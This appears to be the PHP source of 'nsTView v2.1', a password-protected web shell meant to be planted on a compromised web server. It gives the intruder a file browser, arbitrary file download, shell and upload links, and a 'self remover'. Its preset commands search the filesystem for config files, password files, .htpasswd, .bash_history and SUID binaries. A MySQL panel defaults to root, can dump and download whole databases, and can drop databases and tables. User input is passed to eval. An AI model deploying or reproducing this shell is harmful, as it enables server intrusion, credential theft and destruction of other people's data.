<?
@session_start();
@set_time_limit(0);
@set_magic_quotes_runtime(0);
error_reporting(E_ALL & ~E_NOTICE);
#####cfg#####
# use password  true / false #
$create_password = true;
$password = "nst";    // default password for nstview, you can change it.

# UNIX COMMANDS
# description (nst) command
# example: Shutdown (nst) shutdown -h now
$fast_commands = "
Show open ports (nst) netstat -an | grep LISTEN | grep tcp
last root (nst) last root
last (all users) (nst) last all
Find all config.php in / (nst) find / -type f -name config.php
Find all config.php in . (nst) find . -type f -name config.php
Find all admin.php in / (nst) find / -type f -name admin.php
Find all admin.php in . (nst) find . -type f -name admin.php
Find all config.inc.php in / (nst) find / -type f -name config.inc.php
Find all config.inc.php in . (nst) find . -type f -name config.inc.php
Find all config.inc in / (nst) find / -type f -name config.inc
Find all config.inc in . (nst) find . -type f -name config.inc
Find all config.dat in / (nst) find / -type f -name config.dat
Find all config.dat in . (nst) find . -type f -name config.dat
Find all config* in / (nst) find / -type f -name config*
Find all config* in . (nst) find . -type f -name config*
Find all pass* in / (nst) find / -type f -name pass*
Find all pass* in . (nst) find . -type f -name pass*
Find all .bash_history in / (nst) find / -type f -name .bash_history
Find all .bash_history in . (nst) find . -type f -name .bash_history
Find all .htpasswd  in / (nst) find / -type f -name .htpasswd
Find all .htpasswd  in . (nst) find . -type f -name .htpasswd
Find all writable dirs/files in / (nst) find / -perm -2 -ls
Find all writable dirs/files in . (nst) find . -perm -2 -ls
Find all suid files in / (nst) find / -type f -perm -04000 -ls
Find all suid files in . (nst) find . -type f -perm -04000 -ls
Find all sgid files in / (nst) find / -type f -perm -02000 -ls
Find all sgid files in . (nst) find . -type f -perm -02000 -ls
Find all .fetchmailrc files in / (nst) find / -type f -name .fetchmailrc
Find all .fetchmailrc files in . (nst) find . -type f -name .fetchmailrc
OS Version? (nst) sysctl -a | grep version
Kernel version? (nst) cat /proc/version
cat syslog.conf (nst) cat /etc/syslog.conf
Cat - Message of the day (nst) cat /etc/motd
Cat hosts (nst) cat /etc/hosts
Distrib name (nst) cat /etc/issue.net
Distrib name (2) (nst) cat /etc/*-realise
Display all process - wide output (nst) ps auxw
Display all your process (nst) ps ux
Interfaces (nst) ifconfig
CPU? (nst) cat /proc/cpuinfo
RAM (nst) free -m
HDD space (nst) df -h
List of Attributes (nst) lsattr -a
Mount options (nst) cat /etc/fstab
Is cURL installed? (nst) which curl
Is wGET installed? (nst) which wget
Is lynx installed? (nst) which lynx
Is links installed? (nst) which links
Is fetch installed? (nst) which fetch
Is GET installed? (nst) which GET
Is perl installed? (nst) which perl
Where is apache (nst) whereis apache
Where is perl (nst) whereis perl
locate proftpd.conf (nst) locate proftpd.conf
locate httpd.conf (nst) locate httpd.conf
locate my.conf (nst) locate my.conf
locate psybnc.conf (nst) locate psybnc.conf
";



# WINDOWS COMMANDS
# description (nst) command
# example: Delete autoexec.bat (nst) del c:\autoexec.bat
$fast_commands_win = "
OS Version (nst) ver
Tasklist  (nst) tasklist
Attributes in . (nst) attrib
Show open ports (nst) netstat -an
";





######ver####
$ver= "v2.1";
#############
$pass=$_POST['pass'];
if($pass==$password){
$_SESSION['nst']="$pass";
}
if ($_SERVER["HTTP_CLIENT_IP"]) $ip = $_SERVER["HTTP_CLIENT_IP"];
else if($_SERVER["HTTP_X_FORWARDED_FOR"]) $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
else if($_SERVER["REMOTE_ADDR"]) $ip = $_SERVER["REMOTE_ADDR"];
else $ip = $_SERVER['REMOTE_ADDR'];
$ip=htmlspecialchars($ip);

if($create_password==true){

if(!isset($_SESSION['nst']) or $_SESSION['nst']!=$password){
die("
<title>nsTView $ver:: nst.void.ru</title>
<center>
<table width=100 bgcolor=#D7FFA8 border=1 bordercolor=black><tr><td>
<font size=1 face=verdana><center>
<b>nsTView $ver :: <a href=http://nst.void.ru style='text-decoration:none;'><font color=black>nst.void.ru</font></a><br></b>
</center>
<form method=post>
Password:<br>
<input type=password name=pass size=30 tabindex=1>
</form>
<b>Host:</b> ".$_SERVER["HTTP_HOST"]."<br>
<b>IP:</b> ".gethostbyname($_SERVER["HTTP_HOST"])."<br>
<b>Your ip:</b> ".$ip."
</td></tr></table>
");}

}
$d=$_GET['d'];

function adds($editf){
#if(get_magic_quotes_gpc()==0){
$editf=addslashes($editf);
#}
return $editf;
}
function adds2($editf){
if(get_magic_quotes_gpc()==0){
$editf=addslashes($editf);
}
return $editf;
}

$f   = "nst_sql.txt";
$f_d = $_GET['f_d'];

if($_GET['download']){
$download=$_GET['download'];
header("Content-disposition: attachment; filename=\"$download\";");
readfile("$d/$download");
exit;}

if($_GET['dump_download']){
header("Content-disposition: attachment; filename=\"$f\";");
header("Content-length: ".filesize($f_d."/".$f));
header("Expires: 0");
readfile($f_d."/".$f);
if(is_writable($f_d."/".$f)){
unlink($f_d."/".$f);
}
die;
}


$images=array(".gif",".jpg",".png",".bmp",".jpeg");
$whereme=getcwd();
@$d=@$_GET['d'];
$copyr = "<center><a href=http://nst.void.ru target=_blank>nsTView $ver<br>o... Network security team ...o</a>";
$php_self=@$_SERVER['PHP_SELF'];
if(@eregi("/",$whereme)){$os="unix";}else{$os="win";}
if(!isset($d)){$d=$whereme;}
$d=str_replace("\\","/",$d);
if(@$_GET['p']=="info"){
@phpinfo();
exit;}
if(@$_GET['img']=="1"){
@$e=$_GET['e'];
header("Content-type: image/gif");
readfile("$d/$e");
}
if(@$_GET['getdb']=="1"){
header('Content-type: application/plain-text');
header('Content-Disposition: attachment; filename=nst-mysql-damp.htm');
}
print "<title>nsT View $ver</title>
<style>
BODY, TD, TR {
text-decoration: none;
font-family: Verdana;
font-size: 8pt;
SCROLLBAR-FACE-COLOR: #363d4e;
SCROLLBAR-HIGHLIGHT-COLOR: #363d4e;
SCROLLBAR-SHADOW-COLOR: #363d4e;
SCROLLBAR-ARROW-COLOR: #363d4e;
SCROLLBAR-TRACK-COLOR: #91AAFF
}
input, textarea, select {
font-family: Verdana;
font-size: 10px;
color: black;
background-color: white;
border: solid 1px;
border-color: black
}
UNKNOWN {
COLOR: #0006DE;
TEXT-DECORATION: none
}
A:link {
COLOR: #0006DE;
TEXT-DECORATION: none
}
A:hover {
COLOR: #FF0C0B;
TEXT-DECORATION: none
}
A:active {
COLOR: #0006DE;
TEXT-DECORATION: none
}
A:visited {
TEXT-DECORATION: none
}
</style>
<script>
function ShowOrHide(d1, d2) {
if (d1 != '') DoDiv(d1);
if (d2 != '') DoDiv(d2);}

function DoDiv(id) {
var item = null;
if (document.getElementById) {
item = document.getElementById(id);
} else if (document.all){
item = document.all[id];
} else if (document.layers){
item = document.layers[id];}
if (!item) {}
else if (item.style) {
if (item.style.display == \"none\"){ item.style.display = \"\"; }
else {item.style.display = \"none\"; }
}else{ item.visibility = \"show\"; }}

function cwd(text){
document.sh311Form.sh3.value+=\" \"+ text;
document.sh311Form.sh3.focus();
}


</script>
";
print "<body vlink=#0006DE>
<table width=600 border=0 cellpadding=0 cellspacing=1 bgcolor=#D7FFA8 align=center>
<tr><td><font face=wingdings size=2>0</font>";
$expl=explode("/",$d);
$coun=count($expl);
if($os=="unix"){echo "<a href='$php_self?d=/'>/</a>";}
else{
        echo "<a href='$php_self?d=$expl[0]'>$expl[0]/</a>";}
for($i=1; $i<$coun; $i++){
        @$xx.=$expl[$i]."/";
$sls="<a href='$php_self?d=$expl[0]/$xx'>$expl[$i]</a>/";
$sls=str_replace("//","/",$sls);
$sls=str_replace("/'></a>/","/'></a>",$sls);
print $sls;
}
if(@ini_get("register_globals")){$reg_g="ON";}else{$reg_g="OFF";}
if(@ini_get("safe_mode")){$safe_m="ON";}else{$safe_m="OFF";}
echo "</td></tr>";
if($os=="unix"){ echo "
<tr><td><b>id:</b> ".@exec('id')."</td></tr>
<tr><td><b>uname -a:</b> ".@exec('uname -a')."</td></tr>";} echo"
<tr><td><b>Your IP: [<font color=#5F3CC1>$ip</font>] Server IP: [<font color=#5F3CC1>".gethostbyname($_SERVER["HTTP_HOST"])."</font>] Server <a href=# title='Host.Domain'>H.D.</a>: [<font color=#5F3CC1>".$_SERVER["HTTP_HOST"]."</font>]</b><br>
[<b>Safe mode:</b> $safe_m] [<b>Register globals:</b> $reg_g]<br>
[<a href=# onClick=location.href=\"javascript:history.back(-1)\">Back</a>]
[<a href='$php_self'>Home</a>]
[<a href='$php_self?d=$d&sh311=1'>Shell (1)</a> <a href='$php_self?d=$d&sh311=2'>(2)</a>]
[<a href='$php_self?d=$d&t=upload'>Upload</a>]
[<a href='$php_self?t=tools'>Tools</a>]
[<a href='$php_self?p=info'>PHPinfo</a>]
[<a href='$php_self?delfolder=$d&d=$d&delfl=1&rback=$d' title='$d'>DEL Folder</a>]
[<a href='$php_self?p=sql'>SQL</a>]
[<a href='$php_self?p=selfremover'>Self Remover</a>]
</td></tr>
";
if($os=="win"){ echo "
<tr><td bgcolor=white>
<center><font face=wingdings size=2><</font>
<a href='$php_self?d=a:/'>A</a>
<a href='$php_self?d=b:/'>B</a>
<a href='$php_self?d=c:/'>C</a>
<a href='$php_self?d=d:/'>D</a>
<a href='$php_self?d=e:/'>E</a>
<a href='$php_self?d=f:/'>F</a>
<a href='$php_self?d=g:/'>G</a>
<a href='$php_self?d=h:/'>H</a>
<a href='$php_self?d=i:/'>I</a>
<a href='$php_self?d=j:/'>J</a>
<a href='$php_self?d=k:/'>K</a>
<a href='$php_self?d=l:/'>L</a>
<a href='$php_self?d=m:/'>M</a>
<a href='$php_self?d=n:/'>N</a>
<a href='$php_self?d=o:/'>O</a>
<a href='$php_self?d=p:/'>P</a>
<a href='$php_self?d=q:/'>Q</a>
<a href='$php_self?d=r:/'>R</a>
<a href='$php_self?d=s:/'>S</a>
<a href='$php_self?d=t:/'>T</a>
<a href='$php_self?d=u:/'>U</a>
<a href='$php_self?d=v:/'>V</a>
<a href='$php_self?d=w:/'>W</a>
<a href='$php_self?d=x:/'>X</a>
<a href='$php_self?d=y:/'>Y</a>
<a href='$php_self?d=z:/'>Z</a>
</td></tr>";}else{echo "<tr><td>&nbsp;</td></tr>";}
print "<tr><td>
:: <a href='$php_self?d=$d&mkdir=1'>Create folder</a> ::
<a href='$php_self?d=$d&mkfile=1'>Create file</a> ::
<a href='$php_self?d=$d&read_file_safe_mode=1'>Read file if safe mode is On</a> ::";
if($os=="unix"){
print "<a href='$php_self?d=$d&ps_table=1'>PS table</a> ::";
}
print "</td></tr>";





if($_GET['p']=="ftp"){
print "<tr><td>";



print "</td></tr></table>";
print $copyr;
exit;
}










if(@$_GET['p']=="sql"){
print "<tr><td>";
###

$f_d = $_GET['f_d'];
if(!isset($f_d)){$f_d=".";}
if($f_d==""){$f_d=".";}

$php_self=$_SERVER['PHP_SELF'];
$delete_table=$_GET['delete_table'];
$tbl=$_GET['tbl'];
$from=$_GET['from'];
$to=$_GET['to'];
$adress=$_POST['adress'];
$port=$_POST['port'];
$login=$_POST['login'];
$pass=$_POST['pass'];
$adress=$_GET['adress'];
$port=$_GET['port'];
$login=$_GET['login'];
$pass=$_GET['pass'];
$conn=$_GET['conn'];
if(!isset($adress)){$adress="localhost";}
if(!isset($login)){$login="root";}
if(!isset($pass)){$pass="";}
if(!isset($port)){$port="3306";}
if(!isset($from)){$from=0;}
if(!isset($to)){$to=50;}


?>
<style>
table,td{
color: black;
font-face: verdana;
font-size: 11px;

}
</style>
<font color=black face=verdana size=1>
<? if(!$conn){ ?>

<!-- table 1 -->
<table bgcolor=#D7FFA8>
<tr><td valign=top>Address:</td><td><form><input name=adress value='<?=$adress?>' size=20><input name=port value='<?=$port?>' size=6></td></tr>
<tr><Td valign=top>Login: </td><td><input name=login value='<?=$login?>' size=10></td></tr>
<tr><Td valign=top>Pass:</td><td> <input name=pass value='<?=$pass?>' size=10><input type=hidden name=p value=sql></td></tr>
<tr><td></td><td><input type=submit name=conn value=Connect></form></td></tr><?}?>
<tr><td valign=top><? if($conn){ echo "<b>PHP v".@phpversion()."<br>mySQL v".@mysql_get_server_info()."<br>";}?></b></td><td></td></tr>
</table>
<!-- end of table 1 -->


<?
$conn=$_GET['conn'];
$adress=$_GET['adress'];
$port=$_GET['port'];
$login=$_GET['login'];
$pass=$_GET['pass'];
if($conn){

$serv = @mysql_connect($adress.":".$port, $login,$pass) or die("<font color=red>Error: ".mysql_error()."</font>");
if($serv){$status="Connected. :: <a href='$php_self?p=sql'>Log out</a>";}else{$status="Disconnected.";}
print "<b><font color=green>Status: $status<br><br>"; # #D7FFA8
print "<table cellpadding=0 cellspacing=0 bgcolor=#D7FFA8><tr><td valign=top>";
print "<br><font color=red>[db]</font><Br>";
print "<font color=white>";
$res = mysql_list_dbs($serv);
while ($str=mysql_fetch_row($res)){
print "<a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&delete_db=$str[0]' onclick='return confirm(\"DELETE $str[0] ?\")'>[DEL]<a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$str[0]&dump_db=$str[0]&f_d=$d'>[DUMP]</a></a> <b><a href='$php_self?baza=1&db=$str[0]&p=sql&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$str[0]'>$str[0]</a></b><br>";
$tc++;
}
$baza=$_GET['baza'];
$db=$_GET['db'];
print "<font color=red>[Total db: $tc]</font><br>";
if($baza){
print "<div align=left><font color=green>db: [$db]</div></font><br>";
$result=@mysql_list_tables($db);
while($str=@mysql_fetch_array($result)){
$c=mysql_query ("SELECT COUNT(*) FROM $str[0]");
$records=mysql_fetch_array($c);

if(strlen($str[0])>$s4ot){$s4ot=strlen($str[0]);}
if($records[0]=="0"){
print "<a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&delete_table=$str[0]' onclick='return confirm(\"DELETE $str[0] ?\")' title='Delete $str[0]?'>[D]</a><a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&baza=1&rename_table=$str[0]' title='Rename $str[0]'>[R]</a><font color=red>[$records[0]]</font> <a href='$php_self?vnutr=1&p=sql&vn=$str[0]&baza=1&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$str[0]&ins_new_line=1'>$str[0]</a><br>";
}else{
print "<a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&delete_table=$str[0]' onclick='return confirm(\"DELETE $str[0] ?\")' title='Delete $str[0]?'>[D]</a><a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&baza=1&rename_table=$str[0]' title='Rename $str[0]'>[R]</a><font color=red>[$records[0]]</font> <a href='$php_self?vnutr=1&p=sql&vn=$str[0]&baza=1&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$str[0]'>$str[0]</a><br>";
}
mysql_free_result($c);
$total_t++;
}
print "<br><B><font color=red>Total tables: $total_t</font></b>";
                                print "<pre>";
for($i=0; $i<$s4ot+10; $i++){print "&nbsp;";}
                                print "</pre>";
} #end baza




# delete table
if(isset($delete_table)){
mysql_select_db($_GET['db']) or die("<font color=red>".mysql_error()."</font>");
mysql_query("DROP TABLE IF EXISTS $delete_table") or die("<font color=red>".mysql_error()."</font>");
print "<br><b><font color=green>Table [ $delete_table ] :: Deleted success!</font></b>";
print "<meta http-equiv=\"REFRESH\" content=\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&baza=1\">";
}
# end of delete table

# delete database
if(isset($_GET['delete_db'])){
mysql_drop_db($_GET['delete_db']) or die("<font color=red>".mysql_error()."</font>");
print "<br><b><font color=green>Database ".$_GET['delete_db']." :: Deleted Success!";
print "<meta http-equiv=\"REFRESH\" content=\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1\">";
}
# end of delete database

# delete row
if(isset($_POST['delete_row'])){
$_POST['delete_row'] = base64_decode($_POST['delete_row']);
mysql_query("DELETE FROM ".$_GET['tbl']." WHERE ".$_POST['delete_row']) or die("<font color=red>".mysql_error()."</font>");
$del_result = "<br><b><font color=green>Deleted Success!<br>".$_POST['delete_row'];
print "<meta http-equiv=\"REFRESH\" content=\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&vnutr=1&baza=1&vn=".$_GET['vn']."&db=$db&tbl=$tbl\">";
}
# end of delete row


$vn=$_GET['vn'];
print "</td><td valign=top>";
print "<font color=green>Database: $db => $vn</font>";

# edit row
if(isset($_POST['edit_row'])){
$edit_row=base64_decode($_POST['edit_row']);

$r_edit = mysql_query("SELECT * FROM $tbl WHERE $edit_row") or die("<font color=red>".mysql_error()."</font>");
print "<br><br>
       <table border=0 cellpadding=1 cellspacing=1><tr>
       <td><b>Row</b></td><td><b>Value</b></td></tr>";
print  "<form method=post action='$php_self?p=sql&login=".$_GET['login']."&pass=".$_GET['pass']."&adress=".$_GET['adress']."&conn=1&baza=1&tbl=".$_GET['tbl']."&vn=".$_GET['vn']."&db=".$_GET['db']."'>";
print  "<input type=hidden name=edit_row value='".$_POST['edit_row']."'>";
print " <input type=radio name=upd value=update checked>Update<br>
        <input type=radio name=upd value=insert>Insert new<br><br>";


$i=0;
while($mn = mysql_fetch_array($r_edit, MYSQL_ASSOC)){
foreach($mn as $key =>$val){
$type  = mysql_field_type($r_edit, $i);
$len  = mysql_field_len($r_edit, $i);
$del .= "`$key`='".adds($val)."' AND ";
$c=strlen($val);
$val=htmlspecialchars($val, ENT_NOQUOTES);
$str=" <textarea name='$key' cols=39 rows=5>$val</textarea> ";
$buff .= "<tr><td bgcolor=silver><b>$key</b><br><font color=green>(<b>$type($len)</b>)</font></td><td>$str</td></tr>";
$i++;
}

}
$delstring=base64_encode($del);
print "<input type=hidden name=delstring value=\"$delstring\">";
print "$buff</table><br>";
print "<br>";
if(!$_POST['makeupdate']){print "<input type=submit value=Update name=makeupdate></form>";}




if($_POST['makeupdate']){
if($_POST['upd']=='update'){
preg_match_all("/name='(.*?)'\scols=39\srows=5>(.*?)<\/textarea>/i",$buff,$matches3);
$delstring=$_POST['delstring'];
$delstring=base64_decode($delstring);
$delstring = substr($delstring, 0, strlen($delstring)-5);

for($i=0; $i<count($matches3[0]); $i++){
eval("\$".$matches3[1][$i]." = \"".adds2($_POST[$matches3[1][$i]])."\";");
$total_str .= $matches3[1][$i]."='".adds2($_POST[$matches3[1][$i]])."',";
}
$total_str = substr_replace($total_str,"",-1);
$up_string = "UPDATE `$tbl` SET $total_str WHERE $delstring";
$up_string = htmlspecialchars($up_string, ENT_NOQUOTES);
print "<b>PHP var:<br></b>\$sql=\"$up_string\";<br><br>";
print "<meta http-equiv=\"REFRESH\" content=\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&vnutr=1&baza=1&vn=".$_GET['vn']."&db=$db&tbl=$tbl\">";
mysql_query($up_string) or die("<font color=red>".mysql_error()."</font>");
}#end of make update



if($_POST['upd']=='insert'){
preg_match_all("/name='(.*?)'\scols=39\srows=5>(.*?)<\/textarea>/i",$buff,$matches3);
$delstring=$_POST['delstring'];
$delstring=base64_decode($delstring);
$delstring = substr($delstring, 0, strlen($delstring)-5);

for($i=0; $i<count($matches3[0]); $i++){
eval("\$".$matches3[1][$i]." = \"".adds2($_POST[$matches3[1][$i]])."\";");
$total_str .= $matches3[1][$i]."='".adds2($_POST[$matches3[1][$i]])."',,";
}

$total_str = ",,".$total_str;

preg_match_all("/,(.*?)='(.*?)',/i",$total_str,$matches4);

for($i=0; $i<count($matches4[1]); $i++){
        $matches4[1][0]=str_replace(",","",$matches4[1][0]);
        $total_m_i .= "`".$matches4[1][$i]."`,";
        $total_m_x .= "'".$matches4[2][$i]."',";
}
$total_m_i = substr($total_m_i, 0, strlen($total_m_i)-1);
$total_m_x = substr($total_m_x, 0, strlen($total_m_x)-1);

$make_insert="INSERT INTO `$tbl` ($total_m_i) VALUES ($total_m_x)";
mysql_query($make_insert) or die("<font color=red>".mysql_error()."</font>");
print "<b>PHP var:<br></b>\$sql=\"$make_insert\";<br><br>";
print "<meta http-equiv=\"REFRESH\" content=\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&vnutr=1&baza=1&vn=".$_GET['vn']."&db=$db&tbl=$tbl\">";
}#end of insert
}#end of update
}
# end of edit row


# insert new line
if($_GET['ins_new_line']){
$qn = mysql_query('SHOW FIELDS FROM '.$tbl) or die("<font color=red>".mysql_error()."</font>");
print "<form method=post action='$php_self?p=sql&login=".$_GET['login']."&pass=".$_GET['pass']."&adress=".$_GET['adress']."&conn=1&baza=1&tbl=".$_GET['tbl']."&vn=".$_GET['vn']."&db=".$_GET['db']."&ins_new_line=1'>
Insert new line in <b>$tbl</b> table</b><Br><br>";
print "<table>";
while ($new_line = mysql_fetch_array($qn, MYSQL_ASSOC)) {
foreach ($new_line as $key =>$next) {
$buff .= "$next ";
}
$expl=explode(" ",$buff);
$buff2 .= $expl[0]." ";
print "<tr><td bgcolor=silver><b>$expl[0]</b><br><font color=green>(<b>$expl[1]</b>)</font></td>
<td><textarea name='$expl[0]' cols=39 rows=5></textarea>
</td></tr>";
unset($buff);
}
print "</table>
<center><input type=submit value=Insert name=mk_ins></form></center>";
if($_POST['mk_ins']){
preg_match_all("/(.*?)\s/i",$buff2,$matches3);
for($i=0; $i<count($matches3[0]); $i++){
eval("\$".$matches3[1][$i]." = \"".adds2($_POST[$matches3[1][$i]])."\";");
$total_str .= $matches3[1][$i]."='".adds2($_POST[$matches3[1][$i]])."',,";
}

$total_str = ",,".$total_str;
preg_match_all("/,(.*?)='(.*?)',/i",$total_str,$matches4);

for($i=0; $i<count($matches4[1]); $i++){
        $matches4[1][0]=str_replace(",","",$matches4[1][0]);
        $total_m_i .= "`".$matches4[1][$i]."`,";
        $total_m_x .= "'".$matches4[2][$i]."',";
}
$total_m_i = substr($total_m_i, 0, strlen($total_m_i)-1);
$total_m_x = substr($total_m_x, 0, strlen($total_m_x)-1);

$make_insert="INSERT INTO `$tbl` ($total_m_i) VALUES ($total_m_x)";
mysql_query($make_insert) or die("<font color=red>".mysql_error()."</font>");
print "<b>PHP var:<br></b>\$sql=\"$make_insert\";<br><br>";
print "<meta http-equiv=\"REFRESH\" content=\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&vnutr=1&baza=1&vn=".$_GET['vn']."&db=$db&tbl=$tbl\">";
}#end of mk ins
}#end of ins new line






if(isset($_GET['rename_table'])){
$rename_table=$_GET['rename_table'];
print "<br><br>Rename <b>$rename_table</b> to<br><br>
<form method=post action='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&baza=1&rename_table=$rename_table'>
<input name=new_name size=30><center><br>
<input type=submit value=Rename></center>
</form>
";

if(isset($_POST['new_name'])){
mysql_select_db($db) or die("<font color=red>".mysql_error()."</font>");
mysql_query("RENAME TABLE $rename_table TO ".$_POST['new_name']) or die("<font color=red>".mysql_error()."</font>");
print "<br><font color=green>Table <b>$rename_table</b> renamed to <b>".$_POST['new_name']."</b></font>";
print "<meta http-equiv=\"REFRESH\" content=\"2;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&db=$db\">";
}

}#end of rename


# dump table
if($_GET['dump']){
if(!is_writable($f_d)){die("<br><br><font color=red>This folder $f_d isnt writable!<br>Cannot make dump.<br><br>
<font color=green><b>You can change temp folder for dump file in your browser!<br>
<font color=red>Change variable &f_d=(here writable directory, expl: /tmp or c:/windows/temp)</font><br>
Then press enter</b></font>
</font>");}
mysql_select_db($db) or die("<font color=red>".mysql_error()."</font>");
$fp = fopen($f_d."/".$f,"w");
fwrite($fp, "# nsTView.php v$ver
# Web: http://nst.void.ru
# Dump from: ".$_SERVER["SERVER_NAME"]." (".$_SERVER["SERVER_ADDR"].")
# MySQL version: ".mysql_get_server_info()."
# PHP version: ".phpversion()."
# Date: ".date("d.m.Y - H:i:s")."
# Dump db ( $db ) Table ( $tbl )
# --- eof ---

");
$que = mysql_query("SHOW CREATE TABLE `$tbl`") or die("<font color=red>".mysql_error()."</font>");
$row = mysql_fetch_row($que);
fwrite($fp, "DROP TABLE IF EXISTS `$tbl`;\r\n");
$row[1]=str_replace("\n","\r\n",$row[1]);
fwrite($fp, $row[1].";\r\n\r\n");
$que = mysql_query("SELECT * FROM `$tbl`");
if(mysql_num_rows($que)>0){
while($row = mysql_fetch_assoc($que)){
$keys = join("`, `", array_keys($row));
$values = array_values($row);
foreach($values as $k=>$v) {$values[$k] = adds2($v);}
$values = implode("', '", $values);
$sql = "INSERT INTO `$tbl`(`$keys`) VALUES ('".$values."');\r\n";
fwrite($fp, $sql);
}
}
fclose($fp);
print "<meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&dump_download=1&f_d=$f_d/\">";
}#end of dump




# db dump
if($_GET['dump_db']){
$c=mysql_num_rows(mysql_list_tables($db));
if($c>=1){
print "<br><br>&nbsp;&nbsp;&nbsp;Dump database <b>$db</b>";
}else{
print "<br><br><font color=red>Cannot dump database. No tables exists in <b>$db</b> db.</font>";
die;
}
if(sizeof($tabs)==0){
$res = mysql_query("SHOW TABLES FROM $db");
if(mysql_num_rows($res)>0){
while($row=mysql_fetch_row($res)){
$tabs[] .= $row[0];
}
}
}
$fp = fopen($f_d."/".$f,"w");
fwrite($fp, "# nsTView.php v$ver
# Web: http://nst.void.ru
# Dump from: ".$_SERVER["SERVER_NAME"]." (".$_SERVER["SERVER_ADDR"].")
# MySQL version: ".mysql_get_server_info()."
# PHP version: ".phpversion()."
# Date: ".date("d.m.Y - H:i:s")."
# Dump db ( $db )
# --- eof ---

");
foreach($tabs as $tab) {
fwrite($fp,"DROP TABLE IF EXISTS `$tab`;\r\n");
$res = mysql_query("SHOW CREATE TABLE `$tab`");
$row = mysql_fetch_row($res);
$row[1]=str_replace("\n","\r\n",$row[1]);
fwrite($fp, $row[1].";\r\n\r\n");
$res = mysql_query("SELECT * FROM `$tab`");
if(mysql_num_rows($res)>0){
while($row=mysql_fetch_assoc($res)){
$keys = join("`, `", array_keys($row));
$values = array_values($row);
foreach($values as $k=>$v) {$values[$k] = adds2($v);}
$values = join("', '", $values);
$sql = "INSERT INTO `$tab`(`$keys`) VALUES ('$values');\r\n";
fwrite($fp, $sql);
}}
fwrite($fp, "\r\n\r\n\r\n");
}
fclose($fp);
print "<meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&dump_download=1&f_d=$f_d/\">";
}#end of db dump






$vnutr=$_GET['vnutr'];
$tbl=$_GET['tbl'];
if($vnutr and !$_GET['ins_new_line']){
print "<table cellpadding=0 cellspacing=1><tr><td>";

mysql_select_db($db) or die(mysql_error());
$c=mysql_query ("SELECT COUNT(*) FROM $tbl");
$cfa=mysql_fetch_array($c);
mysql_free_result($c);
print "
Total: $cfa[0]
<form>
From: <input name=from size=3 value=0>
To: <input name=to size=3 value='$cfa[0]'>
<input type=submit name=show value=Show>
<input type=hidden name=vnutr value=1>
<input type=hidden name=vn value='$vn'>
<input type=hidden name=db value='$db'>
<input type=hidden name=login value='$login'>
<input type=hidden name=pass value='$pass'>
<input type=hidden name=adress value='$adress'>
<input type=hidden name=conn value=1>
<input type=hidden name=baza value=1>
<input type=hidden name=p value=sql>
<input type=hidden name=tbl value='$tbl'>
 [<a href='$php_self?getdb=1&to=$cfa[0]&vnutr=1&vn=$vn&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&p=sql&tbl=$tbl'>DOWNLOAD</a>] [<a href='$php_self?to=$cfa[0]&vnutr=1&vn=$vn&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&p=sql&tbl=$tbl&ins_new_line=1'>INSERT</a>] [<a href='$php_self?to=$cfa[0]&vnutr=1&vn=$vn&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&p=sql&tbl=$tbl&dump=1&f_d=$d'>DUMP</a>]
</form></td></tr></table>";
$vn=$_GET['vn'];
$from=$_GET['from'];
$to=$_GET['to'];
$from=$_GET['from'];
$to=$_GET['to'];
if(!isset($from)){$from=0;}
if(!isset($to)){$to=50;}
$query = "SELECT * FROM $vn LIMIT $from,$to";
$result = mysql_query($query);
$result1= mysql_query($query);
print $del_result;
print "<table cellpadding=0 cellspacing=1 border=1><tr><td></td>";
for ($i=0;$i<mysql_num_fields($result);$i++){
$name=mysql_field_name($result,$i);
$type  = mysql_field_type($result, $i);
$len  = mysql_field_len($result, $i);
print "<td bgcolor=#BCE0FF> $name (<b>$type($len)</b>)</td>";
}
print "</tr><pre>";

while($mn = mysql_fetch_array($result, MYSQL_ASSOC)){
foreach($mn as $key=>$inside){
$buffer1 .= "`$key`='".adds($inside)."' AND ";
$b1 .= "<td>".htmlspecialchars($inside, ENT_NOQUOTES)."&nbsp;</td>";
}
$buffer1  = substr($buffer1, 0, strlen($buffer1)-5);
$buffer1  = base64_encode($buffer1);
print "<td>
<form method=post action='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$tbl&vnutr=1&baza=1&vn=$vn&db=$db'>
<input type=hidden name=delete_row value='$buffer1'>
<input type=submit value=Del onclick='return confirm(\"DELETE ?\")' style='border:1px; background-color:white;'>
</form><form method=post action='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$tbl&baza=1&vn=$vn&db=$db'>
<input type=hidden name=edit_row value='$buffer1'>
<input type=submit value=Edit style='border:1px;background-color:green;'>
</form>
</td>\r\n";
print $b1;
print "</tr>";
unset($b1);
unset($buffer1);
}



mysql_free_result($result);
print "</table>";
} #end vnutr
print "</td></tr></table>";
} # end $conn


###   end of sql
print "</tr></td></table> </td></tr></table>";
print $copyr;
die;
}


